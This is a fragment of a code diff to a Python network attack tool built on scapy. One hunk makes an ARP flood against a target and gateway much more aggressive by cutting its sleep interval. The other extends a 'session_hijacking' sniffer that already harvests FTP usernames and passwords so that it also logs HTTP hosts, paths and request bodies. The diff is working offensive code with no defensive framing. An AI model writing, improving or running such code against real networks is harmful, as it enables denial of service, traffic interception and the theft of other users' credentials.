@@ -63,7 +63,7 @@ def arp_flood(target_ip, target_mac, gateway_ip, gateway_mac, thread_count=500):
 
     try:
         while True:
-            time.sleep(1)
+            time.sleep(0.0001)
     except KeyboardInterrupt:
         print("\nStopping ARP flood attack.")
         stop_event.set()
@@ -105,7 +105,12 @@ def session_hijacking(interface):
             payload = packet[scapy.Raw].load.decode(errors='ignore')
             if 'USER' in payload or 'PASS' in payload:
                 print(f"[+] FTP Credentials: {payload.strip()}")
-
+        if packet.haslayer(HTTPRequest):
+           url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
+           print(f"[+] HTTP Request: {url}")
+           if packet.haslayer(scapy.Raw):
+               load = packet[scapy.Raw].load
+               print(f"[+] Load: {load}")
     print("[*] Sniffing on interface:", interface)
     scapy.sniff(iface=interface, store=False, prn=process_packet)
 
